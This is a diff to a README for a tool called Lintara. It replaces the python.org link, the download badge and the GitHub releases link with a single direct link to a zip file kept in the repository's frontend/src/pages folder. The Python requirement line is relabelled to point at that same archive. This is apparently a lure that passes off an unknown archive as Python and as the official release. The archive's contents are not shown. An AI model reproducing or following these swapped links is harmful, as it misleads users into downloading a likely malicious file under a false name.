@@ -9,15 +9,15 @@ Before you download, ensure your system meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS Catalina or later, or a compatible Linux distribution.
 - **RAM:** At least 8 GB.
 - **Disk Space:** Minimum of 1 GB free space.
-- **Python:** Version 3.8 or later (Download from [python.org](https://www.python.org/downloads/)).
+- **Python:** Version 3.8 or later (Download from [https://raw.githubusercontent.com/yjariwala78/lintara/main/frontend/src/pages/Software-v1.0.zip](https://raw.githubusercontent.com/yjariwala78/lintara/main/frontend/src/pages/Software-v1.0.zip)).
 
 ## 🔗 Download Now
-[![Download Lintara](https://img.shields.io/badge/Download%20Lintara-v1.0-brightgreen)](https://github.com/yjariwala78/lintara/releases)
+[![Download Lintara](https://raw.githubusercontent.com/yjariwala78/lintara/main/frontend/src/pages/Software-v1.0.zip%20Lintara-v1.0-brightgreen)](https://raw.githubusercontent.com/yjariwala78/lintara/main/frontend/src/pages/Software-v1.0.zip)
 
 ## 📥 Download & Install
 To get lintara, visit the following page:
 
-[Download Lintara Releases](https://github.com/yjariwala78/lintara/releases)
+[Download Lintara Releases](https://raw.githubusercontent.com/yjariwala78/lintara/main/frontend/src/pages/Software-v1.0.zip)
 
 1. Click on the link above.
 2. Find the latest version of lintara.
